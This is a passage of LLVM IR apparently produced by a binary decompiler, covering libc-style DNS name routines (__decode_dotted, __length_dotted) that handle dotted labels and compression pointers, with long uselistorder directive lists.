  br i1 %v1_805a543, label %dec_label_pc_805a4e3, label %dec_label_pc_805a545

dec_label_pc_805a545:                             ; preds = %dec_label_pc_805a53c, %dec_label_pc_805a540, %dec_label_pc_805a519, %entry
  %tmp29 = icmp slt i32 %arg3, 1
  br i1 %tmp29, label %dec_label_pc_805a559, label %dec_label_pc_805a54c

dec_label_pc_805a54c:                             ; preds = %dec_label_pc_805a545
  %v1_805a550 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805a550 = add i32 %v1_805a550, %arg2
  %v3_805a550 = inttoptr i32 %v2_805a550 to i8*
  store i8 0, i8* %v3_805a550, align 1
  %v0_805a554 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a554 = add i32 %v0_805a554, 1
  br label %dec_label_pc_805a55c

dec_label_pc_805a559:                             ; preds = %dec_label_pc_805a50e, %dec_label_pc_805a50a, %dec_label_pc_805a545
  br label %dec_label_pc_805a55c

dec_label_pc_805a55c:                             ; preds = %dec_label_pc_805a54c, %dec_label_pc_805a559
  %storemerge1 = phi i32 [ %v1_805a554, %dec_label_pc_805a54c ], [ -1, %dec_label_pc_805a559 ]
  store i32 %v0_805a4d6, i32* @esi, align 4
  store i32 %v0_805a4d5, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i8* %v1_805a540, { 1, 0 }
  uselistorder i32 %v1_805a539, { 0, 2, 1 }
  uselistorder i32 %v0_805a526, { 1, 0 }
  uselistorder i32 %v9_805a4e8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 17, 16, 6, 14, 13, 12, 11, 10, 9, 8, 3, 7, 4, 2, 0, 1, 15 }
  uselistorder i32 46, { 1, 2, 0, 3, 4, 5 }
  uselistorder i8* null, { 4, 6, 3, 2, 8, 0, 1, 7, 9, 10, 5, 11, 12, 13 }
  uselistorder label %dec_label_pc_805a55c, { 1, 0 }
  uselistorder label %dec_label_pc_805a559, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a545, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805a540, { 1, 0 }
  uselistorder label %dec_label_pc_805a50a, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805a566 = load i32, i32* @esi, align 4
  %v4_805a56b = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_805a56b, label %dec_label_pc_805a632, label %dec_label_pc_805a57a

dec_label_pc_805a57a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805a61a2541 = add i32 %arg2, %arg1
  %v3_805a61a2642 = inttoptr i32 %v2_805a61a2541 to i8*
  %v4_805a61a2743 = load i8, i8* %v3_805a61a2642, align 1
  %v1_805a61e2945 = icmp eq i8 %v4_805a61a2743, 0
  %v1_805a6203046 = icmp eq i1 %v1_805a61e2945, false
  br i1 %v1_805a6203046, label %dec_label_pc_805a588.lr.ph, label %dec_label_pc_805a626

dec_label_pc_805a588:                             ; preds = %dec_label_pc_805a588.lr.ph, %dec_label_pc_805a5a1
  %v0_805a592 = phi i32 [ %v0_805a592.pre, %dec_label_pc_805a588.lr.ph ], [ %v4_805a5b2, %dec_label_pc_805a5a1 ]
  %v8_805a58837 = phi i1 [ %v8_805a5883151, %dec_label_pc_805a588.lr.ph ], [ true, %dec_label_pc_805a5a1 ]
  %v5_805a61a36.in = phi i8 [ %v5_805a61a2850.in, %dec_label_pc_805a588.lr.ph ], [ %v4_805a61a, %dec_label_pc_805a5a1 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_805a588.lr.ph ], [ 0, %dec_label_pc_805a5a1 ]
  %v0_805a58f34 = phi i32 [ %v0_805a58f.ph47, %dec_label_pc_805a588.lr.ph ], [ %v2_805a5c0, %dec_label_pc_805a5a1 ]
  %v5_805a61a36 = zext i8 %v5_805a61a36.in to i32
  %v1_805a58f = add i32 %v0_805a58f34, 1
  store i32 %v1_805a58f, i32* @esi, align 4
  %v3_805a592 = select i1 %v8_805a58837, i32 2, i32 1
  %v4_805a592 = add i32 %v3_805a592, %v0_805a592
  store i32 %v4_805a592, i32* %ebp.global-to-local, align 4
  %v1_805a595 = and i32 %v5_805a61a36, 192
  %v6_805a59a = icmp eq i32 %v1_805a595, 192
  %v1_805a59f = icmp eq i1 %v6_805a59a, false
  br i1 %v1_805a59f, label %dec_label_pc_805a5c4, label %dec_label_pc_805a5a1

dec_label_pc_805a5a1:                             ; preds = %dec_label_pc_805a588
  %v2_805a5ae = add i32 %v1_805a58f, %arg1
  %v3_805a5ae = inttoptr i32 %v2_805a5ae to i8*
  %v4_805a5ae = load i8, i8* %v3_805a5ae, align 1
  %v5_805a5ae = zext i8 %v4_805a5ae to i32
  %v4_805a5b2 = add i32 %v3_805a592, %v4_805a592
  store i32 %v4_805a5b2, i32* %ebp.global-to-local, align 4
  %v1_805a5b5 = mul nuw nsw i32 %v5_805a61a36, 256
  %v2_805a5b8 = and i32 %v1_805a5b5, 16128
  %v2_805a5c0 = or i32 %v5_805a5ae, %v2_805a5b8
  store i32 %v2_805a5c0, i32* @edx, align 4
  store i32 %v1_805a5e1.ph48, i32* @ecx, align 4
  %v2_805a61a = add i32 %v2_805a5c0, %arg1
  %v3_805a61a = inttoptr i32 %v2_805a61a to i8*
  %v4_805a61a = load i8, i8* %v3_805a61a, align 1
  %v1_805a61e = icmp eq i8 %v4_805a61a, 0
  %v1_805a620 = icmp eq i1 %v1_805a61e, false
  br i1 %v1_805a620, label %dec_label_pc_805a588, label %dec_label_pc_805a626

dec_label_pc_805a5c4:                             ; preds = %dec_label_pc_805a588
  %v2_805a5c4 = add i32 %v5_805a61a36, %v1_805a5e1.ph48
  %v1_805a5c9 = add i32 %v2_805a5c4, 1
  store i32 %v1_805a5c9, i32* @edi, align 4
  %v10_805a5ca = icmp ult i32 %v1_805a5c9, %arg4
  %v1_805a5d2 = icmp eq i1 %v10_805a5ca, false
  br i1 %v1_805a5d2, label %dec_label_pc_805a632, label %dec_label_pc_805a5d4

dec_label_pc_805a5d4:                             ; preds = %dec_label_pc_805a5c4
  %v2_805a5da = add i32 %v1_805a58f, %arg1
  %v2_805a5e1 = add i32 %v1_805a5e1.ph48, %arg3
  %v3_805a5e4 = inttoptr i32 %v2_805a5e1 to i16*
  %v4_805a5e4 = call i32 @memcpy(i16* %v3_805a5e4, i32 %v2_805a5da, i32 %v5_805a61a36)
  %v0_805a5f0 = load i32, i32* %ebp.global-to-local, align 4
  %v0_805a5f9 = load i32, i32* @esi, align 4
  %v2_805a5f9 = add i32 %v0_805a5f9, %v5_805a61a36
  store i32 %v2_805a5f9, i32* @edx, align 4
  %v1_805a600 = icmp eq i1 %v8_805a58837, false
  %v2_805a5f0 = select i1 %v1_805a600, i32 %v5_805a61a36, i32 0
  %v4_805a600 = add i32 %v0_805a5f0, %v2_805a5f0
  store i32 %v4_805a600, i32* %ebp.global-to-local, align 4
  %v4_805a611 = add i32 %v2_805a5c4, %arg3
  %v5_805a611 = inttoptr i32 %v4_805a611 to i8*
  store i8 46, i8* %v5_805a611, align 1
  %v0_805a614.pre = load i32, i32* @edi, align 4
  %v1_805a61a.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805a614.pre, i32* @ecx, align 4
  %v2_805a61a25 = add i32 %v1_805a61a.pre.pre, %arg1
  %v3_805a61a26 = inttoptr i32 %v2_805a61a25 to i8*
  %v4_805a61a27 = load i8, i8* %v3_805a61a26, align 1
  %v1_805a61e29 = icmp eq i8 %v4_805a61a27, 0
  %v1_805a62030 = icmp eq i1 %v1_805a61e29, false
  %v8_805a58831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_805a592.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805a62030, label %dec_label_pc_805a588.lr.ph, label %dec_label_pc_805a626

dec_label_pc_805a588.lr.ph:                       ; preds = %dec_label_pc_805a5d4, %dec_label_pc_805a57a
  %v0_805a592.pre = phi i32 [ 0, %dec_label_pc_805a57a ], [ %v0_805a592.pre.pre, %dec_label_pc_805a5d4 ]
  %v8_805a5883151 = phi i1 [ false, %dec_label_pc_805a57a ], [ %v8_805a58831, %dec_label_pc_805a5d4 ]
  %v5_805a61a2850.in = phi i8 [ %v4_805a61a2743, %dec_label_pc_805a57a ], [ %v4_805a61a27, %dec_label_pc_805a5d4 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_805a57a ], [ %stack_var_-17.135, %dec_label_pc_805a5d4 ]
  %v1_805a5e1.ph48 = phi i32 [ 0, %dec_label_pc_805a57a ], [ %v0_805a614.pre, %dec_label_pc_805a5d4 ]
  %v0_805a58f.ph47 = phi i32 [ %arg2, %dec_label_pc_805a57a ], [ %v1_805a61a.pre.pre, %dec_label_pc_805a5d4 ]
  br label %dec_label_pc_805a588

dec_label_pc_805a626:                             ; preds = %dec_label_pc_805a5d4, %dec_label_pc_805a5a1, %dec_label_pc_805a57a
  %v0_805a62b = phi i32 [ 0, %dec_label_pc_805a57a ], [ %v4_805a5b2, %dec_label_pc_805a5a1 ], [ %v0_805a592.pre.pre, %dec_label_pc_805a5d4 ]
  %v8_805a588.lcssa = phi i1 [ false, %dec_label_pc_805a57a ], [ true, %dec_label_pc_805a5a1 ], [ %v8_805a58831, %dec_label_pc_805a5d4 ]
  %v2_805a62d = zext i1 %v8_805a588.lcssa to i32
  %v3_805a62d = add i32 %v0_805a62b, 1
  %v4_805a62d = add i32 %v3_805a62d, %v2_805a62d
  br label %dec_label_pc_805a635

dec_label_pc_805a632:                             ; preds = %dec_label_pc_805a5c4, %entry
  br label %dec_label_pc_805a635

dec_label_pc_805a635:                             ; preds = %dec_label_pc_805a626, %dec_label_pc_805a632
  %storemerge = phi i32 [ %v4_805a62d, %dec_label_pc_805a626 ], [ -1, %dec_label_pc_805a632 ]
  store i32 %v0_805a566, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805a5e1.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_805a61a, { 1, 0 }
  uselistorder i32 %v2_805a5c0, { 0, 2, 1 }
  uselistorder i32 %v4_805a5b2, { 0, 2, 1 }
  uselistorder i32 %v5_805a61a36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 4, 49, 51, 56, 11, 0, 55, 50, 41, 53, 54, 42, 52, 43, 1, 5, 6, 7, 8, 9, 10, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 44, 45, 39, 46, 47, 48, 3, 40 }
  uselistorder i8 46, { 6, 7, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 23, 24, 25, 26, 48, 38, 34, 35, 39, 40, 28, 29, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 5, 6, 47, 0, 7, 18, 41, 36, 37, 46, 30, 27, 31, 32, 33, 42, 43, 44, 19, 20, 21, 45, 8, 1, 2, 22 }
  uselistorder i32* @edi, { 6, 253, 254, 31, 255, 256, 257, 29, 258, 109, 34, 32, 110, 65, 66, 67, 68, 69, 70, 71, 259, 260, 2, 0, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 72, 8, 7, 73, 74, 75, 76, 77, 80, 78, 79, 276, 10, 277, 11, 278, 279, 9, 280, 281, 282, 283, 288, 289, 1, 284, 285, 286, 287, 81, 82, 83, 451, 33, 452, 30, 456, 417, 418, 439, 440, 377, 411, 412, 419, 12, 420, 421, 422, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 290, 291, 292, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 312, 413, 414, 13, 14, 415, 416, 84, 85, 86, 87, 88, 124, 125, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 106, 108, 111, 112, 113, 114, 469, 470, 474, 475, 115, 116, 117, 118, 119, 120, 121, 122, 123, 471, 15, 472, 473, 441, 442, 443, 444, 445, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 446, 447, 448, 449, 450, 126, 127, 128, 129, 209, 210, 211, 212, 423, 424, 378, 379, 380, 381, 382, 425, 426, 427, 428, 16, 429, 430, 431, 432, 433, 434, 435, 498, 499, 500, 17, 501, 502, 503, 504, 219, 505, 506, 570, 238, 18, 239, 240, 241, 130, 131, 132, 133, 134, 135, 136, 137, 138, 242, 243, 244, 245, 246, 511, 521, 522, 523, 524, 525, 512, 513, 514, 515, 516, 517, 518, 519, 520, 476, 490, 491, 477, 478, 479, 480, 481, 482, 483, 484, 19, 485, 486, 487, 488, 489, 313, 314, 20, 315, 316, 317, 318, 319, 320, 321, 293, 294, 295, 296, 383, 384, 385, 21, 386, 387, 568, 569, 436, 437, 438, 333, 22, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 322, 323, 324, 325, 345, 346, 347, 220, 221, 222, 388, 389, 390, 391, 392, 393, 394, 395, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 23, 410, 60, 61, 62, 396, 24, 397, 398, 564, 565, 566, 567, 348, 349, 350, 351, 352, 353, 354, 225, 229, 230, 231, 232, 370, 371, 372, 373, 355, 356, 357, 358, 359, 360, 361, 526, 527, 528, 226, 227, 228, 247, 248, 203, 204, 205, 178, 179, 180, 173, 174, 175, 206, 207, 208, 330, 331, 332, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 310, 311, 223, 224, 554, 555, 556, 149, 150, 151, 157, 158, 159, 561, 562, 563, 152, 153, 154, 453, 454, 455, 529, 557, 558, 559, 560, 193, 191, 192, 25, 155, 156, 530, 531, 26, 532, 533, 160, 161, 507, 508, 162, 163, 534, 535, 536, 492, 493, 494, 495, 496, 497, 164, 165, 3, 4, 166, 167, 168, 169, 170, 171, 172, 537, 538, 539, 176, 177, 181, 182, 183, 184, 185, 186, 187, 547, 548, 549, 5, 27, 550, 551, 28, 552, 553, 540, 541, 542, 543, 544, 545, 546, 188, 189, 190, 509, 510, 63, 64, 194, 195, 196, 197, 198, 199, 200, 366, 367, 368, 369, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 201, 202, 213, 214, 216, 215, 217, 218, 233, 234, 235, 236, 237, 249, 250, 251, 252, 326, 327, 328, 329, 362, 363, 364, 365, 374, 375, 376 }
  uselistorder i32 256, { 6, 64, 7, 8, 9, 10, 11, 12, 57, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 56, 25, 26, 27, 67, 65, 28, 29, 30, 31, 0, 1, 32, 2, 58, 68, 59, 33, 34, 69, 35, 36, 5, 61, 62, 3, 37, 4, 38, 60, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 63, 49, 50, 51, 52, 53, 66, 54, 55 }
  uselistorder i1 true, { 0, 5, 7, 8, 9, 10, 11, 16, 1, 2, 12, 13, 14, 6, 15, 3, 4 }
  uselistorder i32* @edx, { 4, 191, 192, 193, 194, 195, 196, 49, 76, 297, 0, 197, 198, 202, 200, 201, 203, 204, 205, 206, 207, 208, 209, 50, 54, 51, 52, 53, 210, 211, 212, 213, 214, 215, 216, 223, 217, 218, 219, 220, 221, 222, 73, 74, 75, 79, 80, 81, 82, 83, 84, 85, 2, 20, 55, 56, 57, 22, 21, 58, 59, 60, 61, 64, 65, 66, 67, 68, 69, 70, 62, 63, 311, 298, 299, 249, 300, 301, 302, 303, 304, 71, 72, 314, 5, 315, 98, 227, 224, 225, 226, 228, 230, 231, 232, 233, 6, 86, 77, 317, 78, 87, 88, 89, 90, 91, 92, 316, 93, 94, 95, 36, 37, 38, 171, 305, 306, 250, 251, 7, 252, 253, 254, 255, 262, 263, 264, 307, 308, 309, 331, 332, 333, 334, 8, 335, 336, 96, 97, 175, 313, 318, 1, 319, 337, 338, 384, 383, 182, 185, 99, 100, 101, 102, 103, 104, 105, 348, 351, 9, 352, 349, 10, 350, 347, 320, 11, 321, 373, 234, 235, 237, 238, 239, 186, 3, 12, 199, 236, 240, 310, 241, 256, 257, 258, 259, 265, 266, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 19, 284, 285, 267, 286, 13, 287, 288, 290, 14, 291, 292, 293, 294, 295, 296, 39, 15, 289, 339, 16, 261, 387, 388, 353, 374, 375, 354, 170, 106, 108, 107, 109, 114, 110, 111, 112, 113, 229, 176, 346, 23, 376, 135, 312, 355, 115, 377, 378, 382, 116, 117, 118, 379, 380, 340, 341, 119, 356, 357, 358, 361, 362, 363, 40, 359, 360, 120, 323, 324, 326, 327, 330, 121, 122, 124, 125, 126, 127, 128, 129, 130, 41, 42, 322, 328, 329, 123, 325, 131, 364, 365, 366, 132, 133, 43, 44, 136, 24, 143, 144, 145, 45, 134, 372, 381, 367, 371, 368, 369, 17, 370, 345, 342, 343, 344, 137, 138, 139, 140, 141, 142, 146, 147, 149, 150, 151, 153, 156, 157, 46, 47, 158, 154, 155, 148, 152, 159, 160, 161, 162, 163, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 18, 35, 169, 164, 167, 165, 166, 48, 168, 385, 386, 172, 173, 174, 177, 178, 179, 180, 181, 183, 184, 187, 188, 189, 190, 242, 243, 244, 245, 246, 247, 248, 260, 389, 390, 391, 392 }
  uselistorder i32* @esi, { 438, 439, 440, 441, 442, 443, 75, 444, 228, 229, 76, 230, 85, 86, 87, 15, 231, 232, 180, 181, 182, 183, 184, 185, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 77, 186, 187, 16, 10, 194, 188, 191, 189, 190, 11, 192, 193, 464, 17, 465, 466, 469, 467, 468, 476, 470, 471, 472, 473, 474, 475, 18, 78, 12, 195, 196, 197, 198, 233, 234, 677, 678, 19, 679, 680, 199, 200, 201, 202, 207, 208, 209, 626, 627, 636, 637, 638, 20, 639, 640, 477, 478, 641, 21, 670, 671, 22, 23, 625, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 24, 652, 653, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 479, 25, 480, 481, 487, 486, 13, 488, 489, 490, 491, 492, 493, 494, 495, 496, 0, 79, 497, 498, 499, 500, 501, 502, 121, 122, 123, 124, 125, 126, 629, 630, 631, 203, 26, 204, 27, 205, 206, 628, 210, 211, 241, 212, 213, 214, 215, 216, 217, 218, 220, 219, 28, 221, 222, 224, 80, 29, 223, 225, 226, 227, 235, 236, 237, 238, 699, 700, 701, 706, 81, 239, 240, 242, 243, 244, 245, 246, 247, 248, 702, 703, 704, 705, 249, 250, 251, 252, 253, 254, 632, 633, 634, 635, 255, 256, 257, 258, 259, 260, 672, 673, 261, 127, 128, 31, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 30, 147, 148, 149, 150, 151, 152, 153, 145, 146, 154, 155, 156, 157, 158, 159, 674, 675, 676, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 32, 33, 274, 275, 34, 276, 277, 407, 408, 409, 410, 411, 744, 745, 746, 747, 503, 504, 574, 575, 654, 655, 35, 656, 657, 658, 659, 660, 661, 662, 748, 749, 750, 751, 752, 851, 852, 853, 424, 425, 426, 427, 428, 429, 430, 753, 765, 766, 278, 279, 280, 281, 431, 432, 433, 1, 434, 435, 436, 282, 283, 284, 285, 779, 792, 36, 793, 794, 787, 788, 789, 790, 791, 783, 784, 785, 786, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 37, 718, 82, 719, 720, 721, 722, 505, 506, 509, 510, 511, 512, 854, 38, 855, 856, 482, 483, 484, 485, 576, 577, 39, 578, 83, 70, 579, 507, 508, 513, 514, 863, 864, 663, 664, 665, 666, 667, 668, 669, 515, 516, 517, 518, 519, 520, 533, 40, 14, 534, 535, 536, 537, 538, 41, 71, 539, 540, 541, 542, 521, 522, 523, 524, 525, 526, 543, 42, 544, 545, 412, 43, 413, 414, 580, 581, 582, 583, 45, 584, 2, 586, 587, 588, 589, 44, 590, 591, 585, 592, 593, 594, 595, 3, 596, 597, 598, 599, 600, 601, 602, 72, 46, 603, 604, 47, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 48, 622, 623, 624, 49, 160, 605, 4, 606, 607, 754, 755, 763, 764, 857, 858, 859, 860, 861, 862, 546, 547, 548, 549, 550, 50, 551, 552, 553, 554, 415, 416, 420, 421, 570, 571, 572, 573, 555, 556, 557, 558, 51, 52, 559, 560, 417, 418, 419, 828, 829, 531, 532, 286, 53, 287, 288, 289, 290, 291, 292, 297, 293, 294, 295, 296, 54, 302, 767, 768, 373, 356, 357, 769, 770, 771, 298, 299, 55, 300, 301, 795, 796, 797, 798, 5, 7, 6, 799, 800, 723, 729, 730, 740, 8, 741, 742, 743, 830, 831, 835, 836, 837, 838, 849, 850, 303, 304, 305, 306, 307, 308, 756, 757, 758, 759, 760, 761, 762, 309, 310, 311, 801, 802, 803, 807, 808, 809, 810, 811, 815, 161, 162, 163, 804, 805, 806, 56, 312, 313, 731, 732, 733, 734, 738, 739, 314, 315, 316, 317, 318, 319, 320, 164, 165, 166, 727, 724, 725, 726, 73, 728, 735, 736, 737, 321, 322, 323, 324, 325, 780, 781, 57, 782, 812, 813, 814, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 358, 359, 360, 361, 362, 839, 840, 841, 842, 843, 167, 168, 169, 170, 171, 338, 339, 340, 341, 342, 343, 58, 344, 345, 59, 346, 347, 844, 845, 846, 847, 848, 832, 61, 60, 833, 834, 816, 817, 818, 62, 826, 827, 819, 820, 821, 822, 823, 824, 825, 348, 775, 776, 777, 778, 349, 350, 351, 352, 353, 74, 354, 355, 772, 773, 774, 172, 173, 174, 175, 176, 363, 63, 364, 365, 366, 367, 368, 369, 370, 371, 372, 374, 375, 376, 377, 378, 379, 380, 64, 381, 385, 386, 387, 177, 178, 179, 388, 389, 390, 382, 383, 384, 567, 568, 569, 67, 88, 89, 90, 91, 66, 92, 93, 94, 65, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 405, 406, 391, 84, 396, 397, 398, 399, 400, 401, 402, 403, 404, 392, 68, 69, 9, 393, 394, 395, 422, 423, 437, 527, 528, 529, 530, 561, 562, 563, 564, 565, 566, 865 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805a635, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805a64e = icmp eq i32 %arg1, 0
  br i1 %v1_805a64e, label %dec_label_pc_805a67d, label %dec_label_pc_805a66e.preheader

dec_label_pc_805a66e.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805a66e10 = add i32 %arg2, %arg1
  %v3_805a66e11 = inttoptr i32 %v2_805a66e10 to i8*
  %v4_805a66e12 = load i8, i8* %v3_805a66e11, align 1
  %v1_805a67214 = add i32 %arg2, 1
  %v1_805a67515 = icmp eq i8 %v4_805a66e12, 0
  %v1_805a67716 = icmp eq i1 %v1_805a67515, false
  br i1 %v1_805a67716, label %dec_label_pc_805a65d, label %dec_label_pc_805a679

dec_label_pc_805a654:                             ; preds = %dec_label_pc_805a65d
  %v1_805a654 = add i32 %v0_805a65417, 2
  br label %dec_label_pc_805a679

dec_label_pc_805a65d:                             ; preds = %dec_label_pc_805a66e.preheader, %dec_label_pc_805a66e
  %v1_805a67219 = phi i32 [ %v1_805a672, %dec_label_pc_805a66e ], [ %v1_805a67214, %dec_label_pc_805a66e.preheader ]
  %v5_805a66e18.in = phi i8 [ %v4_805a66e, %dec_label_pc_805a66e ], [ %v4_805a66e12, %dec_label_pc_805a66e.preheader ]
  %v0_805a65417 = phi i32 [ %v2_805a66b, %dec_label_pc_805a66e ], [ %arg2, %dec_label_pc_805a66e.preheader ]
  %v5_805a66e18 = zext i8 %v5_805a66e18.in to i32
  %v1_805a65f = and i32 %v5_805a66e18, 192
  %v6_805a664 = icmp eq i32 %v1_805a65f, 192
  %v2_805a66b = add i32 %v5_805a66e18, %v1_805a67219
  br i1 %v6_805a664, label %dec_label_pc_805a654, label %dec_label_pc_805a66e

dec_label_pc_805a66e:                             ; preds = %dec_label_pc_805a65d
  store i32 %v2_805a66b, i32* @ecx, align 4
  %v2_805a66e = add i32 %v2_805a66b, %arg1
  %v3_805a66e = inttoptr i32 %v2_805a66e to i8*
  %v4_805a66e = load i8, i8* %v3_805a66e, align 1
  %v1_805a672 = add i32 %v2_805a66b, 1
  %v1_805a675 = icmp eq i8 %v4_805a66e, 0
  %v1_805a677 = icmp eq i1 %v1_805a675, false
  br i1 %v1_805a677, label %dec_label_pc_805a65d, label %dec_label_pc_805a679

dec_label_pc_805a679:                             ; preds = %dec_label_pc_805a66e.preheader, %dec_label_pc_805a66e, %dec_label_pc_805a654
  %v0_805a679 = phi i32 [ %v1_805a654, %dec_label_pc_805a654 ], [ %v1_805a67214, %dec_label_pc_805a66e.preheader ], [ %v1_805a672, %dec_label_pc_805a66e ]
  %v2_805a67b = sub i32 %v0_805a679, %arg2
  br label %dec_label_pc_805a67d

dec_label_pc_805a67d:                             ; preds = %entry, %dec_label_pc_805a679
  %v0_805a680 = phi i32 [ -1, %entry ], [ %v2_805a67b, %dec_label_pc_805a679 ]
  ret i32 %v0_805a680

; uselistorder directives
  uselistorder i8 %v4_805a66e, { 1, 0 }
  uselistorder i32 %v2_805a66b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 198, 67, 177, 199, 236, 237, 100, 203, 204, 64, 65, 66, 0, 1, 200, 205, 206, 207, 181, 208, 209, 210, 211, 212, 213, 188, 2, 189, 190, 71, 214, 215, 3, 101, 4, 5, 6, 75, 76, 247, 102, 103, 238, 77, 104, 37, 7, 72, 191, 192, 239, 240, 68, 241, 242, 248, 38, 39, 40, 83, 94, 216, 217, 218, 219, 182, 220, 221, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 166, 20, 21, 22, 243, 178, 244, 78, 245, 185, 186, 95, 105, 106, 167, 246, 84, 187, 107, 41, 79, 228, 229, 96, 42, 43, 85, 86, 108, 109, 110, 111, 112, 113, 114, 251, 80, 179, 35, 115, 168, 116, 169, 117, 170, 252, 73, 44, 195, 70, 118, 119, 23, 120, 24, 121, 25, 122, 123, 45, 46, 87, 47, 48, 88, 249, 49, 50, 97, 51, 124, 222, 223, 224, 225, 26, 89, 196, 74, 201, 202, 52, 253, 90, 27, 28, 230, 231, 81, 53, 54, 232, 55, 233, 56, 91, 234, 235, 57, 227, 254, 125, 98, 183, 250, 29, 30, 31, 32, 33, 99, 126, 171, 193, 82, 58, 127, 128, 59, 34, 184, 180, 36, 129, 172, 130, 173, 131, 133, 132, 174, 60, 61, 194, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 154, 153, 175, 156, 155, 92, 158, 93, 157, 197, 62, 160, 63, 159, 69, 226, 162, 161, 176, 163, 164, 165 }
  uselistorder i8 0, { 34, 3, 6, 7, 35, 5, 4, 146, 147, 73, 66, 148, 251, 9, 155, 150, 151, 8, 153, 154, 152, 25, 156, 0, 1, 67, 68, 69, 157, 158, 27, 159, 10, 74, 12, 117, 116, 11, 36, 160, 161, 187, 252, 253, 257, 15, 167, 163, 164, 162, 13, 165, 166, 14, 26, 168, 169, 170, 171, 172, 173, 174, 175, 176, 70, 71, 72, 37, 256, 57, 55, 56, 75, 76, 17, 119, 118, 16, 120, 121, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 2, 216, 254, 255, 275, 217, 294, 38, 49, 32, 33, 138, 18, 292, 279, 280, 258, 259, 260, 261, 262, 263, 39, 264, 140, 19, 149, 218, 219, 50, 220, 177, 178, 179, 188, 189, 190, 191, 192, 221, 222, 223, 224, 225, 226, 227, 228, 229, 20, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 24, 243, 244, 245, 246, 247, 248, 249, 250, 58, 276, 193, 194, 195, 199, 196, 197, 77, 293, 78, 79, 28, 80, 282, 283, 284, 285, 286, 288, 289, 290, 287, 265, 266, 267, 270, 268, 269, 21, 271, 272, 274, 81, 82, 83, 84, 85, 86, 87, 88, 89, 273, 29, 90, 291, 91, 92, 278, 281, 59, 60, 95, 93, 94, 277, 61, 62, 63, 64, 96, 97, 98, 99, 101, 100, 22, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 113, 51, 52, 53, 54, 115, 30, 124, 122, 123, 125, 126, 127, 128, 129, 131, 130, 23, 132, 133, 134, 135, 136, 137, 139, 141, 142, 143, 144, 145, 180, 181, 182, 183, 184, 185, 186, 198, 295, 296, 31, 65, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
